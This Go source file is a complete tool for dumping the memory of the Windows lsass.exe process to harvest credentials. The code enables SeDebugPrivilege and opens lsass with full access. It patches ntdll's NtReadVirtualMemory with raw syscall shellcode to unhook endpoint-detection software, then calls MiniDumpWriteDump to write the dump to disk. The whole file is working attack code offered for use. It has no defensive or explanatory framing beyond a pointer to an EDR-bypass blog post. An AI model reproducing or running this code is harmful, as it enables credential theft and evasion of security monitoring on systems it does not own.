package main

import (
	"fmt"
	"io/ioutil"
	"syscall"
	"unsafe"
)

func minidump(pid, proc int) {
	/*
		BOOL MiniDumpWriteDump(
		  HANDLE                            hProcess,
		  DWORD                             ProcessId,
		  HANDLE                            hFile,
		  MINIDUMP_TYPE                     DumpType,
		  PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,
		  PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
		  PMINIDUMP_CALLBACK_INFORMATION    CallbackParam
		);
	*/

	k32 := syscall.NewLazyDLL("Dbgcore.dll")
	m := k32.NewProc("MiniDumpWriteDump")
	f, e := ioutil.TempFile("./", "")
	if e != nil {
		panic(e)
	}
	stdOutHandle := f.Fd()
	r, _, _ := m.Call(ptr(proc), ptr(pid), stdOutHandle, 3, 0, 0, 0)
	if r != 0 {
		fmt.Println("Successfully dumped lsass, wrote dump to ", f.Name())
	}
}

func getProcID(procname string) uint32 {
	//https://github.com/mitchellh/go-ps/blob/master/process_windows.go

	handle, err := syscall.CreateToolhelp32Snapshot(
		0x00000002,
		0)
	if handle < 0 {
		fmt.Println("handle 0 or lower?")
		return 0
	}
	defer syscall.CloseHandle(handle)

	var entry syscall.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))
	err = syscall.Process32First(handle, &entry)
	if err != nil {
		fmt.Println(err)
		return 0
	}

	for {
		s := ""
		for _, chr := range entry.ExeFile {
			if chr != 0 {
				s = s + string(int(chr))
			}
		}
		if s == procname {
			return entry.ProcessID
		}
		err = syscall.Process32Next(handle, &entry)
		if err != nil {
			break
		}
	}
	fmt.Println("Couldn't find process..")
	return 0
}

func setPrivilege(s string, b bool) bool {
	type LUID struct {
		LowPart  uint32
		HighPart int32
	}
	type LUID_AND_ATTRIBUTES struct {
		Luid       LUID
		Attributes uint32
	}
	type TOKEN_PRIVILEGES struct {
		PrivilegeCount uint32
		Privileges     [1]LUID_AND_ATTRIBUTES
	}

	modadvapi32 := syscall.NewLazyDLL("advapi32.dll")
	//kernel32 := syscall.NewLazyDLL("kernel32.dll")
	procAdjustTokenPrivileges := modadvapi32.NewProc("AdjustTokenPrivileges")

	procLookupPriv := modadvapi32.NewProc("LookupPrivilegeValueW")
	var tokenHandle syscall.Token
	thsHandle, err := syscall.GetCurrentProcess()
	if err != nil {
		panic(err)
	}
	syscall.OpenProcessToken(
		//r, a, e := procOpenProcessToken.Call(
		thsHandle,                       //  HANDLE  ProcessHandle,
		syscall.TOKEN_ADJUST_PRIVILEGES, //	DWORD   DesiredAccess,
		&tokenHandle,                    //	PHANDLE TokenHandle
	)
	var luid LUID
	r, a, e := procLookupPriv.Call(
		ptr(0),                         //LPCWSTR lpSystemName,
		ptr(s),                         //LPCWSTR lpName,
		uintptr(unsafe.Pointer(&luid)), //PLUID   lpLuid
	)
	fmt.Println("lookuppriv:", r, a, e)
	SE_PRIVILEGE_ENABLED := uint32(0x00000002)
	privs := TOKEN_PRIVILEGES{}
	privs.PrivilegeCount = 1
	privs.Privileges[0].Luid = luid
	privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
	//AdjustTokenPrivileges(hToken, false, &priv, 0, 0, 0)
	r, a, e = procAdjustTokenPrivileges.Call(
		uintptr(tokenHandle),
		uintptr(0),
		uintptr(unsafe.Pointer(&privs)),
		ptr(0),
		ptr(0),
		ptr(0),
	)
	fmt.Println("adjust privs:", r, a, e)
	return false
}

func getNTReadVirtualSyscall() byte {
	const (
		win8  = 0x060200
		win81 = 0x060300
		win10 = 0x0A0000
	)
	//                    7 and Pre-7     2012SP0   2012-R2    8.0     8.1    Windows 10+
	//NtReadVirtualMemory 0x003c 0x003c    0x003d   0x003e    0x003d 0x003e 0x003f 0x003f

	syscall_id := byte(0x3f)
	//static auto RtlGetVersion = (RtlGetVersion_t)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlGetVersion");
	procRtlGetVersion := syscall.NewLazyDLL("ntdll.dll").NewProc("RtlGetVersion")
	type osVersionInfoExW struct {
		dwOSVersionInfoSize uint32
		dwMajorVersion      uint32
		dwMinorVersion      uint32
		dwBuildNumber       uint32
		dwPlatformId        uint32
		szCSDVersion        [128]uint16
		wServicePackMajor   uint16
		wServicePackMinor   uint16
		wSuiteMask          uint16
		wProductType        uint8
		wReserved           uint8
	}
	var osvi osVersionInfoExW
	osvi.dwOSVersionInfoSize = uint32(unsafe.Sizeof(osvi))
	ret, _, err := procRtlGetVersion.Call(uintptr(unsafe.Pointer(&osvi)))
	if ret != 0 {
		panic("Can't get os version" + err.Error())
	}
	//auto osvi = OSVERSIONINFOEXW{ sizeof(OSVERSIONINFOEXW) };

	//RtlGetVersion((POSVERSIONINFOW)&osvi);

	version_long := (osvi.dwMajorVersion << 16) | (osvi.dwMinorVersion << 8) | uint32(osvi.wServicePackMajor)
	if version_long < win8 { //before win8
		syscall_id = 0x3c
	} else if version_long == win8 { //win8 and server 2008 sp0
		syscall_id = 0x3d
	} else if version_long == win81 { //win 8.1 and server 2008 r2
		syscall_id = 0x3e
	} else if version_long > win81 { //anything after win8.1
		syscall_id = 0x3f
	}
	return syscall_id
}

func freeNtReadVirtualMemory() {
	sysval := getNTReadVirtualSyscall()
	//win64 original values, (todo: add 32bit, and use when in 32bit land)
	shellcode := []byte{
		0x4C, 0x8B, 0xD1, // mov r10, rcx; NtReadVirtualMemory
		0xB8, 0x3c, 0x00, 0x00, 0x00, // eax, 3ch
		0x0F, 0x05, // syscall
		0xC3, // retn
	}
	shellcode[4] = sysval
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	procWriteMem := kernel32.NewProc("WriteProcessMemory")
	ntdll := syscall.NewLazyDLL("ntdll.dll")
	rvm := ntdll.NewProc("NtReadVirtualMemory")
	NtReadVirtualMemory := rvm.Addr()
	thsHandle, _ := syscall.GetCurrentProcess()
	//WriteProcessMemory(GetCurrentProcess(), NtReadVirtualMemory, Shellcode, sizeof(Shellcode), NULL);
	r, a, e := procWriteMem.Call(
		uintptr(thsHandle),                     // this pid (HANDLE hprocess)
		NtReadVirtualMemory,                    // address of target? (LPVOID lpBaseAddress)
		uintptr(unsafe.Pointer(&shellcode[0])), // LPCVOID lpBuffer,
		uintptr(len(shellcode)),                // SIZE_T nSize,
		uintptr(0),                             // SIZE_T *numberofbytes written
	)
	fmt.Println("Unhooking:", r, a, e)

	if r == 0 {
		panic("nooo")
	}
}

func ptr(val interface{}) uintptr {
	switch val.(type) {
	case string:
		return uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(val.(string))))
	case int:
		return uintptr(val.(int))
	default:
		return uintptr(0)
	}
}

//greetz to hoang and his andrewspecial post :)
//https://medium.com/@fsx30/bypass-edrs-memory-protection-introduction-to-hooking-2efb21acffd6
func main() {
	pn := "lsass.exe"
	setPrivilege("SeDebugPrivilege", true)
	pid := getProcID(pn)
	fmt.Println("lsass pid:", pid)
	hProc, err := syscall.OpenProcess(0x1F0FFF, false, pid) //PROCESS_ALL_ACCESS := uint32(0x1F0FFF)
	if err != nil {
		panic(err)
	}
	fmt.Println("proc handle:", hProc)
	if hProc != 0 {
		freeNtReadVirtualMemory()
		minidump(int(pid), int(hProc))
	}
}
